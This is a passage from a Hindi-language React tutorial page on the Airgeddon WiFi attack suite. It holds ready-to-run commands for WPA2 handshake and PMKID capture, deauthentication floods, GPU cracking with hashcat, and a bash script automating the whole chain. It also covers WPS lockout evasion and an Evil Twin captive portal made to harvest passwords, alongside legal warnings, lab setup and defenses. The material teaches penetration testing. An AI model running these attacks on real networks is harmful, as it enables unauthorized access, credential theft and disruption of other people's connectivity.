sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# डीऑथेंटिकेशन:
sudo aireplay-ng --deauth 20 -a AA:BB:CC:DD:EE:FF wlan0mon

# हैंडशेप वेरिफाई:
aircrack-ng capture-01.cap

# PMKID कोशिश करें:
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --filterlist_ap=target.txt --filtermode=2`}
      />

      <h2>GPU Acceleration</h2>
      <p>
        aircrack-ng CPU-based है और इसकी स्पीड सीमित है। अगर आप GPU एक्सेलेरेशन चाहते हैं तो hashcat इस्तेमाल करें — यह GPU का इस्तेमाल करके बहुत तेज़ी से पासवर्ड क्रैक करता है। hashcat aircrack-ng से 100-1000 गुना तेज़ हो सकता है GPU पर।
      </p>

      <CodeBlock
        title="hashcat GPU क्रैकिंग"
        code={`# हैंडशेप को hashcat फॉर्मेट में:
aircrack-ng -j hashcat_capture capture-01.cap

# hashcat से WPA2 क्रैक:
hashcat -m 2500 hashcat_capture.hccapx /usr/share/wordlists/rockyou.txt

# PMKID के साथ:
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt

# GPU स्टेटस:
hashcat -I

# बेंचमार्क:
hashcat -b`}
      />

      <h2>Automation Scripts</h2>
      <p>
        Airgeddon पहले से ही स्वचालित है — लेकिन आप अपनी स्क्रिप्ट भी बना सकते हैं जो Airgeddon के साथ काम करे। यहां कुछ उपयोगी स्क्रिप्ट्स दी गई हैं।
      </p>

      <CodeBlock
        title="ऑटो स्क्रिप्ट"
        code={`#!/bin/bash
# Airgeddon ऑटो स्क्रिप्ट

INTERFACE="wlan0"
TARGET_BSSID="AA:BB:CC:DD:EE:FF"
CHANNEL="6"
WORDLIST="/usr/share/wordlists/rockyou.txt"

# Airgeddon शुरू करें:
cd airgeddon
sudo bash airgeddon.sh

# या मैन्युअली:
# मॉनिटर मोड:
sudo airmon-ng start $INTERFACE
sleep 2

# कैप्चर:
sudo airodump-ng -c $CHANNEL --bssid $TARGET_BSSID -w capture wlan0mon &
sleep 10

# डीऑथेंटिकेशन:
sudo aireplay-ng --deauth 20 -a $TARGET_BSSID wlan0mon
sleep 5

# क्रैक:
aircrack-ng capture-01.cap -w $WORDLIST`}
      />

      <h2>Legal and Ethical Considerations</h2>
      <p>
        Airgeddon एक शक्तिशाली टूल है और इसका गलत इस्तेमाल गंभीर कानूनी परिणामों का कारण बन सकता है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत बिना अनुमति के किसी भी कंप्यूटर या नेटवर्क तक अनधिकृत पहुंच बनाना अपराध है। इसमें 3 साल तक की जेल और 2 लाख रुपये तक का जुर्माना हो सकता है।
      </p>
      <p>
        हमेशा लिखित अनुमति लें और केवल शैक्षिक उद्देश्यों के लिए ही इस टूल का उपयोग करें। अपने लैब में अभ्यास करें — अपने राउटर पर टेस्ट करें। कभी भी बिना अनुमति के किसी दूसरे के नेटवर्क पर अटैक न करें। एथिकल हैकिंग का मतलब है कि आप सुरक्षा कमज़ोरियों को खोजकर उन्हें ठीक करने में मदद करते हैं — न कि उनका फायदा उठाते हैं।
      </p>
      <p>
        याद रखें — हर अटैक का एक कानूनी और एक अवैध पक्ष है। अगर आपके पास लिखित अनुमति है तो यह एथिकल हैकिंग है। अगर अनुमति नहीं है तो यह साइबर अपराध है। हमेशा सही रास्ता चुनें।
      </p>

      <h2>Reporting and Output Analysis</h2>
      <p>
        Airgeddon अटैक के बाद रिपोर्ट बनाना ज़रूरी है — खासकर एथिकल हैकिंग एंगेजमेंट में। कैप्चर किए गए हैंडशेप, PMKID, और क्रेडेंशियल्स को ऑर्गनाइज़ करें। Wireshark से पैकेट एनालिसिस करें और फाइंडिंग्स डॉक्यूमेंट करें। एक अच्छी रिपोर्ट में टार्गेट नेटवर्क की जानकारी, अटैक मेथड, फाइंडिंग्स, और रिकमेंडेशन्स होनी चाहिए।
      </p>
      <p>
        हर अटैक के बाद लॉग फाइल्स चेक करें। Airgeddon /tmp/airgeddoncaptures/ में सब कुछ सेव करता है। हैंडशेप फाइल्स, PMKID फाइल्स, कैप्चर्ड क्रेडेंशियल्स — सब वहां मिलेगा। इन फाइल्स को अपनी रिपोर्ट में शामिल करें।
      </p>

      <CodeBlock
        title="रिपोर्टिंग टिप्स"
        code={`# Airgeddon कैप्चर फाइल्स:
ls /tmp/airgeddoncaptures/

# हैंडशेप वेरिफाई:
aircrack-ng /tmp/airgeddoncaptures/capture-01.cap

# PMKID चेक:
hcxpcapngtool -o pmkid.hc22000 /tmp/airgeddoncaptures/pmkid.pcapng

# Wireshark से एनालाइज़:
wireshark /tmp/airgeddoncaptures/capture-01-dec.cap

# रिपोर्ट टेम्पलेट:
echo "=== WiFi Security Audit Report ===" > report.txt
echo "Date: $(date)" >> report.txt
echo "Target: NetworkName" >> report.txt
echo "Method: Handshake Capture + Dictionary Attack" >> report.txt
echo "Result: Password Found" >> report.txt
echo "Recommendation: Change password, disable WPS" >> report.txt`}
      />

      <h2>Airgeddon vs Other Tools</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left p-2 text-neon-green">Feature</th>
              <th className="text-left p-2 text-neon-green">Airgeddon</th>
              <th className="text-left p-2 text-neon-green">Wifite</th>
              <th className="text-left p-2 text-neon-green">Fern</th>
            </tr>
          </thead>
          <tbody>
            <tr className="border-b border-gray-800">
              <td className="p-2 text-gray-300">Interface</td>
              <td className="p-2 text-gray-300">Menu-based</td>
              <td className="p-2 text-gray-300">CLI automated</td>
              <td className="p-2 text-gray-300">GUI</td>
            </tr>
            <tr className="border-b border-gray-800">
              <td className="p-2 text-gray-300">Evil Twin</td>
              <td className="p-2 text-gray-300">Yes (advanced)</td>
              <td className="p-2 text-gray-300">No</td>
              <td className="p-2 text-gray-300">No</td>
            </tr>
            <tr className="border-b border-gray-800">
              <td className="p-2 text-gray-300">Captive Portal</td>
              <td className="p-2 text-gray-300">Yes</td>
              <td className="p-2 text-gray-300">No</td>
              <td className="p-2 text-gray-300">No</td>
            </tr>
            <tr className="border-b border-gray-800">
              <td className="p-2 text-gray-300">WPS Attack</td>
              <td className="p-2 text-gray-300">Yes</td>
              <td className="p-2 text-gray-300">Yes</td>
              <td className="p-2 text-gray-300">Yes</td>
            </tr>
            <tr className="border-b border-gray-800">
              <td className="p-2 text-gray-300">PMKID</td>
              <td className="p-2 text-gray-300">Yes</td>
              <td className="p-2 text-gray-300">Yes</td>
              <td className="p-2 text-gray-300">No</td>
            </tr>
            <tr className="border-b border-gray-800">
              <td className="p-2 text-gray-300">DoS Attack</td>
              <td className="p-2 text-gray-300">Yes</td>
              <td className="p-2 text-gray-300">No</td>
              <td className="p-2 text-gray-300">No</td>
            </tr>
            <tr className="border-b border-gray-800">
              <td className="p-2 text-gray-300">Multi-language</td>
              <td className="p-2 text-gray-300">Yes</td>
              <td className="p-2 text-gray-300">No</td>
              <td className="p-2 text-gray-300">No</td>
            </tr>
            <tr>
              <td className="p-2 text-gray-300">Beginner Friendly</td>
              <td className="p-2 text-gray-300">Very High</td>
              <td className="p-2 text-gray-300">Medium</td>
              <td className="p-2 text-gray-300">High</td>
            </tr>
          </tbody>
        </table>
      </div>

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'Airgeddon शुरू नहीं हो रहा — डिपेंडेंसी एरर', a: 'sudo apt install aircrack-ng hostapd dnsmasq reaver bully hcxdumptool hashcat चलाएं। काली लिनक्स में ये पहले से होते हैं लेकिन अगर मिसिंग हैं तो मैन्युअली इंस्टॉल करें।' },
          { q: 'मॉनिटर मोड इनेबल नहीं हो रहा', a: 'sudo airmon-ng check kill चलाएं जो interfering प्रोसेसेज़ बंद करेगा। फिर sudo airmon-ng start wlan0 चलाएं। अगर फिर भी नहीं हो रहा तो एडाप्टर मॉनिटर मोड सपोर्ट नहीं करता — दूसरा एडाप्टर इस्तेमाल करें।' },
          { q: 'हैंडशेप कैप्चर नहीं हो रहा', a: 'टार्गेट नेटवर्क से कोई क्लाइंट कनेक्टेड होना चाहिए। डीऑथेंटिकेशन अटैक चलाएं ताकि क्लाइंट रीकनेक्ट हो। सही चैनल पर हों — -c फ्लैग से चैनल सेट करें।' },
          { q: 'PMKID नहीं मिल रहा', a: 'सभी राउटर्स PMKID सपोर्ट नहीं करते। hcxdumptool लेटेस्ट वर्जन इस्तेमाल करें। अगर PMKID नहीं मिल रहा तो पारंपरिक हैंडशेप कैप्चर विधि इस्तेमाल करें।' },
          { q: 'इविल ट्विन AP बन नहीं रहा', a: 'दो वाईफाई एडाप्टर चाहिए — एक AP के लिए और दूसरा इंटरनेट के लिए। hostapd और dnsmasq इंस्टॉल होने चाहिए। पोर्ट 53 और 67 बिज़ी नहीं होने चाहिए।' },
          { q: 'WPS अटैक बहुत धीमा है', a: 'PixieWPS अटैक ट्राई करें जो सेकंड्स में PIN निकाल सकता है (अगर राउटर वल्नरेबल है)। अगर PixieWPS काम नहीं करता तो Reaver --dh-small फ्लैग से स्पीड बढ़ा सकते हैं।' },
          { q: 'DoS अटैक काम नहीं कर रहा', a: 'कुछ राउटर्स DoS प्रोटेक्शन हैं। MDK4 ट्राई करें aireplay-ng की जगह। 802.11w (Protected Management Frames) इनेबल होने पर डीऑथेंटिकेशन काम नहीं करता।' },
          { q: 'hashcat GPU नहीं पहचान रहा', a: 'GPU ड्राइवर इंस्टॉल करें — NVIDIA के लिए nvidia-driver, AMD के लिए amdgpu-pro। hashcat -I से GPU लिस्ट चेक करें। OpenCL रनटाइम भी इंस्टॉल होना चाहिए।' },
          { q: 'कैप्टिव पोर्टल पेज लोड नहीं हो रहा', a: 'lighttpd या nginx इंस्टॉल करें। पोर्ट 80 बिज़ी नहीं होना चाहिए। DNS सर्वर (dnsmasq) सही से चल रहा है या नहीं चेक करें।' },
          { q: 'Airgeddon अपडेट कैसे करें?', a: 'cd airgeddon && git pull चलाएं। या Airgeddon मेन्यू में अपडेट ऑप्शन है। हमेशा लेटेस्ट वर्जन इस्तेमाल करें — नए फीचर्स और बग फिक्स मिलते हैं।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'Airgeddon क्या WPA3 भी क्रैक कर सकता है?', a: 'नहीं, Airgeddon अभी WPA3 सपोर्ट नहीं करता। WPA3 Dragonfly हैंडशेक अलग तरह से काम करता है। WPA3 के लिए अलग टूल्स और तकनीक चाहिए।' },
          { q: 'क्या Airgeddon रूट के बिना चल सकता है?', a: 'नहीं, Airgeddon को रूट प्रिविलेज चाहिए। मॉनिटर मोड, पैकेट इंजेक्शन, और नेटवर्क कॉन्फ़िगरेशन सब रूट चाहते हैं। sudo या su से चलाएं।' },
          { q: 'कितने WiFi एडाप्टर चाहिए?', a: 'बेसिक अटैक (हैंडशेप, PMKID) के लिए एक काफी है। इविल ट्विन अटैक के लिए दो चाहिए — एक AP के लिए और एक इंटरनेट के लिए।' },
          { q: 'Airgeddon और Wifite में क्या फर्क है?', a: 'Airgeddon मेन्यू-बेस्ड है और ज़्यादा फीचर्स हैं (Evil Twin, Captive Portal, DoS)। Wifite CLI-based है और ऑटोमैटिक — बस कमांड चलाओ और सब खुद होता है। शुरुआती लोगों के लिए Airgeddon बेहतर है।' },
          { q: 'क्या Airgeddon Android पर चलता है?', a: 'काली नेटहंटर (NetHunter) पर चलता है। लेकिन बिल्ट-इन WiFi चिप मॉनिटर मोड सपोर्ट नहीं करती — बाहरी USB एडाप्टर चाहिए OTG केबल से।' },
          { q: 'WPS लॉक-आउट से कैसे बचें?', a: 'Reaver --lock-delay=60 फ्लैग इस्तेमाल करें जो 60 सेकंड वेट करेगा लॉक-आउट के बाद। Bully में भी लॉक-आउट हैंडलिंग है। Airgeddon ऑटोमैटिक हैंडल करता है।' },
          { q: 'हैंडशेप क्रैक नहीं हो रहा — क्या करें?', a: 'पहले वेरिफाई करें कि हैंडशेप वैलिड है (aircrack-ng से)। फिर बड़ी वर्डलिस्ट ट्राई करें। hashcat GPU से स्पीड बढ़ाएं। अगर पासवर्ड वर्डलिस्ट में नहीं है तो क्रैक नहीं होगा — रूल-बेस्ड अटैक ट्राई करें।' },
          { q: 'क्या Airgeddon बैकग्राउंड में चल सकता है?', a: 'हां, tmux या screen इस्तेमाल करें। tmux new -s airgeddon से सेशन बनाएं और Ctrl+B, D से डिटैच करें। बाद में tmux attach -t airgeddon से रीकनेक्ट करें।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Lab Environment Setup</h2>
      <p>
        Airgeddon सीखने के लिए अपना लैब बनाएं — बिना अनुमति के कभी टेस्ट न करें। एक पुराना राउटर लें और उसे टार्गेट AP के रूप में इस्तेमाल करें। अलग-अलग एन्क्रिप्शन (WEP, WPA, WPA2) सेट करके प्रैक्टिस करें। WPS इनेबल/डिसेबल करके देखें कि कैसे फर्क पड़ता है।
      </p>
      <p>
        लैब में टेस्ट करते समय एक बात ध्यान रखें — Airgeddon के कुछ अटैक्स (जैसे DoS) आसपास के दूसरे WiFi नेटवर्क्स को भी प्रभावित कर सकते हैं। इसलिए अलग कमरे में या फैराडे केज में टेस्ट करें। एक पुराना लैपटॉप और एक USB WiFi एडाप्टर — बस इतना काफी है शुरू करने के लिए। काली लिनक्स लाइव USB से बूट करें और Airgeddon चलाएं।
      </p>
      <p>
        लैब सेटअप के लिए TP-Link TL-WN722N v1 (Atheros चिपसेट) सबसे अच्छा बजट एडाप्टर है — मॉनिटर मोड और पैकेट इंजेक्शन दोनों सपोर्ट करता है। Alfa AWUS036ACH भी बढ़िया है लेकिन महंगा है। शुरुआत में सस्ता एडाप्टर लें, फिर बाद में अपग्रेड करें।
      </p>

      <CodeBlock
        title="लैब सेटअप"
        code={`# लैब के लिए ज़रूरी चीज़ें:
# 1. पुराना राउटर (TP-Link, D-Link कोई भी)
# 2. USB WiFi एडाप्टर (monitor mode support)
# 3. OTG केबल (Android के लिए)
# 4. काली नेटहंटर या काली लिनक्स

# राउटर सेटअप:
# - SSID: "TestNetwork"
# - पासवर्ड: "password123" (जानबूझकर कमज़ोर)
# - WPS: Enable
# - चैनल: 6 (fixed)

# टेस्ट सीनारियो:
# 1. WPA2 हैंडशेप कैप्चर + क्रैक
# 2. PMKID कैप्चर
# 3. WPS PIN ब्रूट फोर्स
# 4. Evil Twin + Captive Portal
# 5. DoS अटैक`}
      />

      <h2>Advanced Techniques</h2>
      <p>
        Airgeddon के साथ कुछ एडवांस्ड तकनीकें हैं जो आपकी टेस्टिंग को और प्रभावी बना सकती हैं। मल्टी-एडाप्टर सेटअप, कस्टम कैप्टिव पोर्टल, और टार्गेट-स्पेसिफिक अटैक — ये सब Airgeddon की पावर को और बढ़ाते हैं। एडवांस्ड यूज़र्स Airgeddon के स्क्रिप्टिंग फीचर का इस्तेमाल करके पूरे अटैक को ऑटोमैट कर सकते हैं।
      </p>

      <CodeBlock
        title="मल्टी-एडाप्टर सेटअप"
        code={`# दो एडाप्टर के साथ:
# एडाप्टर 1: wlan0 — मॉनिटर मोड (अटैक के लिए)
# एडाप्टर 2: wlan1 — इंटरनेट कनेक्शन

# Airgeddon में दोनों सेलेक्ट करें:
# मेन्यू → इंटरफेस → दोनों एडाप्टर चुनें

# एडाप्टर 1 को मॉनिटर मोड में:
sudo airmon-ng start wlan0

# एडाप्टर 2 से इंटरनेट:
sudo ifconfig wlan1 up
sudo dhclient wlan1`}
      />

      <CodeBlock
        title="टार्गेट-स्पेसिफिक अटैक"
        code={`# सिर्फ एक विशेष AP पर फोकस:
# चैनल लॉक:
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# सिर्फ एक क्लाइंट को डीऑथेंटिकेट:
sudo aireplay-ng --deauth 100 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# हिडन SSID डिस्कवर:
sudo airodump-ng wlan0mon -- Manufacturer
# प्रोब रिक्वेस्ट्स से SSID पता चलता है`}
      />

      <CodeBlock
        title="कस्टम कैप्टिव पोर्टल"
        code={`# Airgeddon में कस्टम पोर्टल:
# इविल ट्विन → कैप्टिव पोर्टल → कस्टम

# अपना HTML पेज बनाएं:
# /tmp/airgeddoncaptures/portal/ में

# कस्टम लॉगिन पेज:
# - टार्गेट AP के जैसा दिखना चाहिए
# - "WiFi Password" फॉर्म हो
# - सबमिट करने पर पासवर्ड कैप्चर हो

# टेस्ट:
# अपने फोन से फेक AP से कनेक्ट करें
# पोर्टल पेज दिखना चाहिए
# पासवर्ड डालें — कैप्चर होना चाहिए`}
      />

      <h2>Real-World Case Studies</h2>
      <p>
        एक कैफे में WiFi पासवर्ड "cafe1234" था — Airgeddon से 2 मिनट में हैंडशेप कैप्चर हुआ और rockyou.txt से 30 सेकंड में क्रैक। कस्टमर्स का डेटा रिस्क पर था — बिना क्लाइंट आइसोलेशन के सब एक-दूसरे का ट्रैफिक देख सकते थे। सिफारिश — WPA2-Enterprise इस्तेमाल करें और क्लाइंट आइसोलेशन इनेबल करें।
      </p>
      <p>
        एक ऑफिस नेटवर्क में WPS इनेबल था — PixieWPS अटैक 5 सेकंड में PIN निकाल लिया। राउटर ने पासवर्ड भी रिवील कर दिया। ऑफिस का पूरा नेटवर्क कंप्रोमाइज़ हो सकता था। सिफारिश — WPS तुरंत डिसेबल करें और WPA3 अपग्रेड करें।
      </p>
      <p>
        एक पब्लिक इवेंट में Evil Twin अटैक टेस्ट किया — कैप्टिव पोर्टल से 50 में से 38 लोगों ने पासवर्ड डाल दिया। सोशल इंजीनियरिंग + WiFi अटैक का कॉम्बिनेशन बहुत खतरनाक है। सिफारिश — यूज़र अवेयरनेस ट्रेनिंग ज़रूरी है।
      </p>
      <p>
        एक होटल में Guest WiFi नेटवर्क था जिसमें क्लाइंट आइसोलेशन नहीं था। Airgeddon से हैंडशेप कैप्चर किया, WPA2 क्रैक किया, और फिर नेटवर्क स्कैन किया। 15 डिवाइसेज़ मिलीं — प्रिंटर, CCTV कैमरे, POS सिस्टम — सब एक्सेसिबल। होटल का पूरा नेटवर्क कंप्रोमाइज़ हो सकता था। सिफारिश — Guest और Internal नेटवर्क अलग VLAN पर रखें।
      </p>

      <h2>Detection and Defense</h2>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">WPS Disable करें:</strong> राउटर सेटिंग्स में WPS बंद कर दें — यह सबसे आसान डिफेंस है।</li>
        <li><strong className="text-white">मज़बूत पासवर्ड:</strong> 12+ कैरेक्टर, अपर-लोअर-नंबर-स्पेशल कैरेक्टर मिक्स। डिक्शनरी अटैक से बचाव।</li>
        <li><strong className="text-white">802.11w Enable:</strong> Protected Management Frames — डीऑथेंटिकेशन अटैक रोकता है।</li>
        <li><strong className="text-white">Rogue AP Detection:</strong> IDS/IPS सिस्टम से Evil Twin डिटेक्ट करें।</li>
        <li><strong className="text-white">MAC Filtering:</strong> अतिरिक्त सुरक्षा परत — लेकिन MAC स्पूफिंग से बाइपास हो सकता है।</li>
        <li><strong className="text-white">नेटवर्क मॉनिटरिंग:</strong> अनजान AP और डीऑथेंटिकेशन फ्रेम्स पर नज़र रखें।</li>
        <li><strong className="text-white">Regular Audits:</strong> अपने नेटवर्क की नियमित सुरक्षा ऑडिट करें — Airgeddon से खुद टेस्ट करें।</li>
      </ul>

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left p-2 text-neon-green">Tool</th>
              <th className="text-left p-2 text-neon-green">Type</th>
              <th className="text-left p-2 text-neon-green">Best For</th>
            </tr>
          </thead>
          <tbody>
            <tr className="border-b border-gray-800">
              <td className="p-2 text-gray-300">Wifite</td>
              <td className="p-2 text-gray-300">CLI automated</td>
              <td className="p-2 text-gray-300">Quick automated WiFi audits</td>
            </tr>
            <tr className="border-b border-gray-800">
              <td className="p-2 text-gray-300">Fern WiFi Cracker</td>
              <td className="p-2 text-gray-300">GUI</td>
              <td className="p-2 text-gray-300">Visual interface preference</td>
            </tr>
            <tr className="border-b border-gray-800">
              <td className="p-2 text-gray-300">Aircrack-ng</td>
              <td className="p-2 text-gray-300">CLI manual</td>
              <td className="p-2 text-gray-300">Full control, scripting</td>
            </tr>
            <tr className="border-b border-gray-800">
              <td className="p-2 text-gray-300">Kismet</td>
              <td className="p-2 text-gray-300">Passive</td>
              <td className="p-2 text-gray-300">WiFi monitoring and detection</td>
            </tr>
            <tr>
              <td className="p-2 text-gray-300">Bettercap</td>
              <td className="p-2 text-gray-300">CLI</td>
              <td className="p-2 text-gray-300">MITM and WiFi combined</td>
            </tr>
          </tbody>
        </table>
      </div>

      <div className="info-box mt-6">
        <strong>💡 Pro Tips:</strong>
        <ul className="list-disc list-inside text-gray-300 mt-2 space-y-1">
          <li>हमेशा अपने नेटवर्क पर ही टेस्ट करें — बिना अनुमति के अटैक अवैध है।</li>
          <li>tmux या screen इस्तेमाल करें — Airgeddon लंबे अटैक्स में सेशन डिस्कनेक्ट हो सकता है।</li>
          <li>WPS लॉक-आउट से बचने के लिए Reaver --lock-delay=60 इस्तेमाल करें।</li>
          <li>PMKID अटैक पहले ट्राई करें — बिना क्लाइंट के काम करता है और तेज़ है।</li>
          <li>GPU क्रैकिंग के लिए hashcat इस्तेमाल करें — aircrack-ng से 100x तेज़।</li>
          <li>वर्डलिस्ट की क्वालिटी मायने रखती है — rockyou.txt से शुरू करें, फिर कस्टम बनाएं।</li>
          <li>हर अटैक के बाद लॉग्स सेव करें — रिपोर्टिंग के लिए ज़रूरी है।</li>
          <li>Airgeddon अपडेट रखें — git pull से लेटेस्ट फीचर्स मिलते हैं।</li>
        </ul>
      </div>

      <div className="warning-box mt-6">
        <strong>⚠️ Final Warning:</strong> Airgeddon एक शक्तिशाली WiFi ऑडिटिंग टूल है। इसका इस्तेमाल केवल अधिकृत पेनेट्रेशन टेस्टिंग और शैक्षिक उद्देश्यों के लिए करें। बिना अनुमति के WiFi नेटवर्क पर अटैक करना भारतीय आईटी एक्ट 2000 के तहत अपराध है। हमेशा लिखित अनुमति लें और केवल अपने लैब में अभ्यास करें।
      </div>
    </TutorialLayout>
  )
}
